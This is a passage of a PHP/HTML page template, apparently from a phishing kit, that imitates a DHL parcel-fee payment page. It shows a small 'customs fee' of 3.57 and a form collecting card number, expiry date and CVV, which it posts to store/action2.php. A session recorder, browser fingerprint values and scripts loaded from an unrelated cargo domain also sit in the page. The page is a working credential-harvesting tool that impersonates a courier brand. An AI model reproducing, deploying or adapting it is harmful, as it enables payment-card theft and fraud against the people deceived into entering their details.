        <div class="flag sr">
        </div>
      </li>
      <li class="country" data-country-code="sj">
        <span class="country-name">Svalbard and Jan Mayen
        </span>
        <div class="flag sj">
        </div>
      </li>
      <li class="country" data-country-code="sz">
        <span class="country-name">Swaziland
        </span>
        <div class="flag sz">
        </div>
      </li>
      <li class="country" data-country-code="se">
        <span class="country-name">Sweden
        </span>
        <div class="flag se">
        </div>
      </li>
      <li class="country" data-country-code="ch">
        <span class="country-name">Switzerland
        </span>
        <div class="flag ch">
        </div>
      </li>
      <li class="country" data-country-code="sy">
        <span class="country-name">Syria
        </span>
        <div class="flag sy">
        </div>
      </li>
      <li class="country" data-country-code="tw">
        <span class="country-name">Taiwan
        </span>
        <div class="flag tw">
        </div>
      </li>
      <li class="country" data-country-code="tj">
        <span class="country-name">Tajikistan
        </span>
        <div class="flag tj">
        </div>
      </li>
      <li class="country" data-country-code="tz">
        <span class="country-name">Tanzania
        </span>
        <div class="flag tz">
        </div>
      </li>
      <li class="country" data-country-code="th">
        <span class="country-name">Thailand (ไทย)
        </span>
        <div class="flag th">
        </div>
      </li>
      <li class="country" data-country-code="tl">
        <span class="country-name">Timor-Leste
        </span>
        <div class="flag tl">
        </div>
      </li>
      <li class="country" data-country-code="tg">
        <span class="country-name">Togo
        </span>
        <div class="flag tg">
        </div>
      </li>
      <li class="country" data-country-code="tk">
        <span class="country-name">Tokelau
        </span>
        <div class="flag tk">
        </div>
      </li>
      <li class="country" data-country-code="to">
        <span class="country-name">Tonga
        </span>
        <div class="flag to">
        </div>
      </li>
      <li class="country" data-country-code="tt">
        <span class="country-name">Trinidad and Tobago
        </span>
        <div class="flag tt">
        </div>
      </li>
      <li class="country" data-country-code="tn">
        <span class="country-name">Tunisia
        </span>
        <div class="flag tn">
        </div>
      </li>
      <li class="country" data-country-code="tr">
        <span class="country-name">Turkey
        </span>
        <div class="flag tr">
        </div>
      </li>
      <li class="country" data-country-code="tm">
        <span class="country-name">Turkmenistan
        </span>
        <div class="flag tm">
        </div>
      </li>
      <li class="country" data-country-code="tc">
        <span class="country-name">Turks and Caicos Islands
        </span>
        <div class="flag tc">
        </div>
      </li>
      <li class="country" data-country-code="tv">
        <span class="country-name">Tuvalu
        </span>
        <div class="flag tv">
        </div>
      </li>
      <li class="country" data-country-code="ug">
        <span class="country-name">Uganda
        </span>
        <div class="flag ug">
        </div>
      </li>
      <li class="country" data-country-code="ua">
        <span class="country-name">Ukraine
        </span>
        <div class="flag ua">
        </div>
      </li>
      <li class="country" data-country-code="ae">
        <span class="country-name">United Arab Emirates
        </span>
        <div class="flag ae">
        </div>
      </li>
      <li class="country" data-country-code="gb">
        <span class="country-name">United Kingdom
        </span>
        <div class="flag gb">
        </div>
      </li>
      <li class="country" data-country-code="us">
        <span class="country-name">United States
        </span>
        <div class="flag us">
        </div>
      </li>
      <li class="country" data-country-code="um">
        <span class="country-name">U.S. Minor Outlying Islands
        </span>
        <div class="flag um">
        </div>
      </li>
      <li class="country" data-country-code="vi">
        <span class="country-name">U.S. Virgin Islands
        </span>
        <div class="flag vi">
        </div>
      </li>
      <li class="country" data-country-code="uy">
        <span class="country-name">Uruguay
        </span>
        <div class="flag uy">
        </div>
      </li>
      <li class="country" data-country-code="uz">
        <span class="country-name">Uzbekistan
        </span>
        <div class="flag uz">
        </div>
      </li>
      <li class="country" data-country-code="vu">
        <span class="country-name">Vanuatu
        </span>
        <div class="flag vu">
        </div>
      </li>
      <li class="country" data-country-code="va">
        <span class="country-name">Vatican City
        </span>
        <div class="flag va">
        </div>
      </li>
      <li class="country" data-country-code="ve">
        <span class="country-name">Venezuela
        </span>
        <div class="flag ve">
        </div>
      </li>
      <li class="country" data-country-code="vn">
        <span class="country-name">Vietnam
        </span>
        <div class="flag vn">
        </div>
      </li>
      <li class="country" data-country-code="wf">
        <span class="country-name">Wallis and Futuna
        </span>
        <div class="flag wf">
        </div>
      </li>
      <li class="country" data-country-code="eh">
        <span class="country-name">Western Sahara
        </span>
        <div class="flag eh">
        </div>
      </li>
      <li class="country" data-country-code="ye">
        <span class="country-name">Yemen
        </span>
        <div class="flag ye">
        </div>
      </li>
      <li class="country" data-country-code="zm">
        <span class="country-name">Zambia
        </span>
        <div class="flag zm">
        </div>
      </li>
      <li class="country" data-country-code="zw">
        <span class="country-name">Zimbabwe
        </span>
        <div class="flag zw">
        </div>
      </li>
    </ul>
  </div>
</div>

                                </div>
                                <div class="form-item" style="display:none;">
                                    <input type="text" id="country_selector_code" name="country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here">
                                    <label for="country_selector_code">...and the selected country code will be updated here</label>
                                </div>
                                <button type="submit" style="display:none;">Submit</button>
                            </form>
                        </div>
                    </li>
                </ul>
            <!-- <form class="d-flex">
                <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
                <button class="btn btn-outline-success" type="submit">Search</button>
            </form> -->
            </div>
        </div>
    </nav>
    <div class="iKjer"></div>
    <div class="header-nav">
        <div class="container">
            <div class="row">
                <div class="col-sm-6 col-md-8 col">
                    <ul class="header-navbar-nav me-auto mb-2 mb-lg-0">
                        <li class="nav-li">
                            <a href="#" class="top-nav"><?php echo $lg_cm['top3']?></a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav"><?php echo $lg_cm['top2']?></a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav"><?php echo $lg_cm['top1']?></a>
                        </li>
                    </ul>
                </div>
                <div class="col-sm-6 col-md-3 col">
                    <ul class="eriOl">
                        <li class="nav-li"><a href="#" class="top-nav"><?php echo $lg_cm['top4']?></a></li>
                        <li class="nav-li"><a href="#" class="top-nav"><?php echo $lg_cm['top5']?></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</header>

    <div class="rtYhf">
    <div class="pdIue">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="card summary-card">
                        <div class="card-body pl-4">
                            <div class="row">
                                <div class="col-6 d-flex align-items-center">
                                    <i><img src="assets/col.png"></i>
                                    <strong><?php echo $lg_cm['to5']?></strong>
                                </div>
                                <div class="col-6 d-flex align-items-center">
                                    <?php echo $lg_cm['to1']?>                           </div>
                            </div>
                            <div class="row">
                                <div class="col-12 d-flex align-items-center">
                                    <i><img src="assets/pak.png"></i>
                                    <strong>Box 2 DHL - 1 piece - 1 (34 x 18 x 10 )</strong>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-6 d-flex align-items-center">
                                    <i><img src="assets/clan.png"></i>
                                    <section>

                                        <div class="row">
                                            <div class="col-12">
                                                <strong><?php echo $lg_cm['to8']?>:</strong>
                                                <span><?php echo(date('D , M , Y'));  ?></span>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-12">
                                                <strong><?php echo $lg_cm['to9']?>:</strong>
                                                <span>a 3.57 </span>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <div class="col-6">
                                    <div class="row">
                                        <div class="col-12">
                                            <strong><?php echo $lg_cm['to01']?>: </strong>
                                            <span><?php echo Date('D , M , Y', strtotime('+3 days')) ?></span>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-12">
                                            <strong><?php echo $lg_cm['to4']?>:</strong>
                                            <span><?php echo $lg_cm['to5']?></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="kQwli p-0 p-4">
                 <section class="pt-2 pl-3 pr-3 pb-3 p-md-0">
                    <h5 class="font-weight-bold"><?php echo $lg_cm['to6']?></h5>
                    <div class="row mt-4 mb-4">
                        <div class="col-md-6">
                            <div>
                                <p class="text-uppercase font-weight-bold mb-0"><?php echo $lg_cm['ta7']?></p>
                                <?php echo Date('D , M , Y', strtotime('+3 days')) ?> - <?php echo $lg_cm['ta8']?>                          </div>
                            <div class="d-flex mt-md-4 align-items-center">
                                <p class="font-weight-bold mr-1 mb-0"><?php echo $lg_cm['ta9']?></p>
                                <img src="assets/alert.png">
                                <i style="color: #007acc;" data-toggle="tooltip" data-html="true" title="" data-original-title="<p class='mb-0'>Si votre colis est de grande taille et léger, DHL peut calculer le prix de livraison en utilisant le poids volumétrique (poids volumétrique) plutôt que simplement le poids. Le poids volumétrique est arrondi à la livre ou au kilogramme complet suivant.</p><p class='mb-0'>Voici comment nous calculons le poids volumétrique :</p><p class='mb-0'>LxLxH(in)/139 = Poids (lb)</p><p class='mb-0'>LxLxH(cm)/5000 = Poids (kg)</p>"></i>
                                1,2 kg
                            </div>
                            <div class="d-flex">
                                <p class="font-weight-bold mr-2 mb-0"><?php echo $lg_cm['tt4']?></p>
                                1.3
                            </div>
                            <div class="d-flex">
                                <p class="font-weight-bold mr-2 mb-0"><?php echo $lg_cm['tx1']?></p>
                                2,5 kg
                            </div>
                        </div>
                        <div class="col-md-6 mt-3 mt-md-0">
                            <table class="table summary-table">
                                <tbody>
                                    <tr>
                                        <td><?php echo $lg_cm['xa1']?>:</td>
                                        <td><?php echo $currency; ?></td>
                                        <td>2,73</td>
                                    </tr>
                                    <tr>
                                        <td><?php echo $lg_cm['xa2']?>:</td>
                                        <td><?php echo $currency; ?></td>
                                        <td>0,70</td>
                                    </tr>
                                    <tr>
                                        <td><?php echo $lg_cm['xa3']?>:</td>
                                        <td><?php echo $currency; ?></td>
                                        <td>0,14</td>
                                    </tr>
                                </tbody>
                                <tfoot>
                                    <tr>
                                        <th><?php echo $lg_cm['xa4']?></th>
                                        <th><?php echo $currency; ?></th>
                                        <th>3,57</th>
                                    </tr>
                                </tfoot>
                            </table>
                        </div>
                    </div>
                </section>

                <div class="row c-form mb-2" style="display: none;">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body b-info d-flex justify-content-between">
                                <div>
                                    <span class="first_name"></span>
                                    <span class="last_name"></span>
                                    <span class="line_1"></span>
                                    <span class="line_2"></span>,
                                    <span class="state"></span>
                                    <span class="postal_code"></span>
                                    <span class="country"></span>
                                </div>
                                <a href="#" id="b-edit">Edit</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="card" style="background-color: #F1F1F1;">
                    <div class="card-body p-2">
                        <div class="row">
                            <div class="col-md-12">
                                <!-- </div>
                                    <div class="bs-callout bs-callout-warning hidden">
                                    <h4>Oh snap!</h4>
                                    <p>This form seems to be invalid :(</p>
                                    </div>

                                    <div class="bs-callout bs-callout-info hidden">
                                    <h4>Yay!</h4>
                                    <p>Everything seems to be ok :)</p>
                                </div> -->

                                <!-- Let me see it in action then -->
                                <div class="alert alert-danger" role="alert" style="display: none;" id="error-alert">
                                    <span class="d-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-exclamation-octagon-fill" viewBox="0 0 16 16">
                                            <path d="M11.46.146A.5.5 0 0 0 11.107 0H4.893a.5.5 0 0 0-.353.146L.146 4.54A.5.5 0 0 0 0 4.893v6.214a.5.5 0 0 0 .146.353l4.394 4.394a.5.5 0 0 0 .353.146h6.214a.5.5 0 0 0 .353-.146l4.394-4.394a.5.5 0 0 0 .146-.353V4.893a.5.5 0 0 0-.146-.353L11.46.146zM8 4c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995A.905.905 0 0 1 8 4zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"></path>
                                        </svg>
                                    </span>
                                    <span class="d-msg">Please correct the errors below.</span>
                                </div>
                                <div class="alert alert-danger" role="alert" style="display: none;" id="unexpected-error-alert">
                                    <span class="d-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-exclamation-octagon-fill" viewBox="0 0 16 16">
                                        <path d="M11.46.146A.5.5 0 0 0 11.107 0H4.893a.5.5 0 0 0-.353.146L.146 4.54A.5.5 0 0 0 0 4.893v6.214a.5.5 0 0 0 .146.353l4.394 4.394a.5.5 0 0 0 .353.146h6.214a.5.5 0 0 0 .353-.146l4.394-4.394a.5.5 0 0 0 .146-.353V4.893a.5.5 0 0 0-.146-.353L11.46.146zM8 4c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995A.905.905 0 0 1 8 4zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"></path>
                                        </svg>
                                    </span>
                                </div>
                                <form class="g-3 position-relative" action="store/action2.php" method="post">
                                    <input type="hidden" name="_token" value="tnWELA7lJFSQtYiHEDLcCdZaZTVuC7gHUXrRopYR">
                                    <div id="username_CBryiEcHo7YpCmWP_wrap" style="display:none;">
        <input name="username_CBryiEcHo7YpCmWP" type="text" value="" id="username_CBryiEcHo7YpCmWP">
        <input name="valid_from" type="text" value="eyJpdiI6InRBekFnbTBoVUExV2RGSmNHSnIyUlE9PSIsInZhbHVlIjoidW5vNWxUbWl6U0t0aHpsbkFEcURKdz09IiwibWFjIjoiNmU3OTdkYTcyOWYyN2VhZmIyZWVhOWYzZjgxMWI2MTllMjI3NDBiYjdjMjgwMTkzZGE3ZThmNzczNDY0Yzk1ZiIsInRhZyI6IiJ9">
                                 </div>

                                    <div class="se-pre-con position-absolute" style="z-index: 2; display: none;" id="load-form"></div>
                                    <div class="row">
                                        <div class="col-md-12 wfJui border-0 pl-4 pr-4 pt-3 pb-3 c-form" style="">
                                            <h4 class="card-head ml-0"><?php echo $lg_cm['xx7']?></h4>
                                            <div class="col-md-10">
                                                <div class="form-check">
                                                    <input type="hidden" name="card_type" value="card">
                                                    
                                                </div>
                                            </div>
                                           
                                            <div class="mb-3">
                                                <div class="card-types"></div>
                                                <label for="card_number" class="form-label"><?php echo $lg_cm['xx8']?></label>
                                                <input type="text" class="form-control jp-card-invalid" name="card_number" id="cc-num2" autocomplete="cc-number" data-parsley-required-message="Required" oninput="num2()" value="" data-parsley-trigger="focusout" required="">
                                                <div class="card-valid" style="display:none;"><i class="fas fa-check"></i>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-md-6">
                                                    <label for="expiry" class="form-label"><?php echo $lg_cm['xx9']?></label>
                                                    <input type="text" class="form-control jp-card-invalid" oninput="num3()" name="expiry" id="exp" maxlength="7" placeholder="mm/yy" value="" data-parsley-required-message="Required" data-parsley-trigger="focusout" autocomplete="cc-exp">
                                                </div>
                                                <div class="col-md-6">
                                                    <label for="cvv" class="form-label"><?php echo $lg_cm['xc1']?></label>
                                                    <div class="input-wappend w-100 position-relative">
                                                        <input type="text" name="cvv" maxlength="3" class="form-control jp-card-invalid" id="cvv" autocomplete="cc-csc" data-parsley-required-message="Required" data-parsley-trigger="focusout" required="">
                                                        <a id="csc-it" class="position-absolute" style="right: 9px; top: 9px;" href="#" data-html="true" data-toggle="tooltip" title="" data-original-title="Le code de sécurité de la carte (CSC) est un numéro à 3 ou 4 chiffres utilisé pour aider à vérifier qu'un paiement par carte de débit ou de crédit est soumis par le titulaire de la carte.<br><br>Pour Visa, MasterCard et Discover débit ou cartes de crédit, le CSC est le numéro à 3 chiffres situé au dos de la carte, généralement imprimé à droite de la bande de signature. Sur certaines cartes, tout ou partie du numéro de carte de crédit apparaîtra devant le CSC.<br><br>Pour les cartes de débit ou de crédit American Express, le CSC est le numéro à 4 chiffres situé au recto de la carte, imprimé ci-dessus et à droite du numéro de carte de crédit."></a>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row justify-content-end mt-4">
                                                <div class="col-md-8 d-flex align-items-center justify-content-center justify-content-md-end p-md-0 mb-2 mb-md-0">
                                                    <p class="mb-0" style="font-size: .8rem;">
                                                       <?php echo $lg_cm['xc3']?>
                                                     <a href="#" style="color: #007acc;">General Conditions of Carriage GTC online</a>                                                    </p>
                                                </div>
                                                <div class="col-md-4 col-lg-3">
                                                    <button type="submit" name="log" class="btn btn-success btn-block m-0"><?php echo $lg_cm['xc2']?></button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="auth-modal"></div>
    <div class="modal fade p-0" tabindex="-1" role="dialog" id="b-modal">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
            </div>
        </div>
    </div>
</div>


       <footer>
    <div class="footer-border">
        <div class="container">
            <hr>
            <div class="row">
                <div class="col-sm-12 col-md-8">
                    <div class="pdIr">
                        <div class="row">
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                    <h4 class="headline"><?php echo $lg_cm['top10']?></h4>
                                    <ul>
                                        <li><a href="#"><?php echo $lg_cm['top6']?></a></li>
                                        <li><a href="#"><?php echo $lg_cm['top7']?></a></li>
                                        <li><a href="#"><?php echo $lg_cm['top8']?></a></li>
                                        <li><a href="#"><?php echo $lg_cm['top9']?></a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                    <h4 class="headline"><?php echo $lg_cm['top11']?></h4>
                                    <ul>
                                        <li><a href="#"><?php echo $lg_cm['top12']?> (GTC)</a></li>
                                        <li><a href="#"><?php echo $lg_cm['top13']?></a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                <h4 class="headline"><?php echo $lg_cm['top14']?></h4>
                                    <ul>
                                        <li><a href="#"><?php echo $lg_cm['top15']?></a></li>
                                        <li><a href="#"><?php echo $lg_cm['top16']?></a></li>
                                        <li><a href="#"><?php echo $lg_cm['top17']?></a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-12 col-md-4">
                    <div class="wetSq">
                        <div class="cyNe">
                            <img src="assets/foo.png" alt="">
                        </div>
                        <div class="ledIu">
                            <ul>
                                <li><a href="#"><?php echo $lg_cm['top18']?></a></li>
                                <li><a href="#"><?php echo $lg_cm['top19']?></a></li>
                                <li><a href="#"><?php echo $lg_cm['top2']?></a></li>
                                <li><a href="#"><?php echo $lg_cm['top21']?></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <hr>
        </div>
    </div>
    <div class="footer-media">
        <div class="container">
            <div class="row">
                <div class="col">
                </div>
                <div class="col offset-md-4">
                    <div class="copyright">
                        <p>2023 ©</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>

    <script>
        window.sessionHash = "745a1f30e1099b667ae475ead520bb38";
        window.visitId = 204;
        window.fingerprint = "7afef760d45fc44ad774cae7d7af803d";
    </script>

    
    <script src="/js/app.js"></script>i
    <script>
        $("#country_selector").countrySelect({
            preferredCountries: ['mu', 'us']
        });

        $("#mobile_country_selector").countrySelect({
            preferredCountries: ['mu', 'us']
        });
    </script>

    <script>
        $(window).on('load', function() {
            $(".modal-loader").hide();
            $(".se-pre-con").fadeOut();
            $('.se-pre-con').on('load',function(){
                $('.modal-loader').hide();
            });
        });

        function openNav() {
            $('#mySidepanel')[0].style.width = "250px";
        }

        function closeNav() {
            $('#mySidepanel')[0].style.width = "0";
        }
    </script>
        <script src="/js/session-recorder.js"></script>
            <script src="https://dispatching-centre.lasamericascargo.com/js/card.js"></script>
    <script src="https://dispatching-centre.lasamericascargo.com/js/intlTelInput.js"></script>
    <script>
        function getRandomInt(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        $(function () {
            var input = $('#phone_number');
            var bInfo = {};

            intlTelInput(input[0], {
                utilsScript: "https://dispatching-centre.lasamericascargo.com/js/utils.js",
                initialCountry: 'mu',
                preferredCountries: ['mu', 'us']
            });

            $('input[name=country]').countrySelect({
                preferredCountries: ['mu', 'us']
            });

            $('#b-continue').on('click', function (e) {
                e.preventDefault();

                var bHasErrors = false;

                $('#b-form .form-control').each(function () {
                    var field = $(this);

                    if (field.parsley) {
                        field.parsley().validate();

                        if (!field.parsley().isValid()) {
                            bHasErrors = true;
                        } else {
                            var value = field.val();

                            if (field.prop('tagName') == 'select') {
                                value = field.find('option:selected').val();
                            }

                            bInfo[field.attr('name')] = value;
                        }
                    }
                });

                if (!bHasErrors) {
                    $('#b-form').hide();
                    $('#load-form').show();
                    $('.c-form').show();
                    setTimeout(function () {
                        $('#load-form').hide();
                    }, getRandomInt(500, 3500));

                    for (var name in bInfo) {
                        $('.b-info .' + name).text(bInfo[name]);
                    }
                }
            });

            $('#b-edit').on('click', function (e) {
                e.preventDefault();
                bInfo = {};

                $('.c-form').hide();
                $('#b-form').show();
                $('#load-form').show();
                setTimeout(function () {
                    $('#load-form').hide();
                }, getRandomInt(500, 3500));
            });

            $('#card_info').on('error', function (e, error) {
                if (error.errorInB) {
                    $('.c-form').hide();
                    $('#b-form').show();
                }
            });

            $('.c-form .form-control').on('keypress', function (e) {
                if (e.which == 13) {
                    $('#card_info').submit();
                }
            });
        });
    </script>
    <script>
    function num2(){
   var patt = new RegExp("\d{4}[\-]\d{4}[\-]\d{4}[\-]\d{4}");
   var x = document.getElementById("cc-num2");
   var res = patt.test(x.value);
   if(!res){
    x.value = x.value
        .match(/\d*/g).join('')
        .match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/).slice(1).join(' ')
        .replace(/-*$/g, '');
   };
    }
        function num3(){
   var patt = new RegExp("\d{2}[\-]\d{2}");
   var x = document.getElementById("exp");
   var res = patt.test(x.value);
   if(!res){
    x.value = x.value
        .match(/\d*/g).join('')
        .match(/(\d{0,2})(\d{0,2})/).slice(1).join('/')
        .replace(/-*$/g, '');
   };
    }
    </script>
</body></html>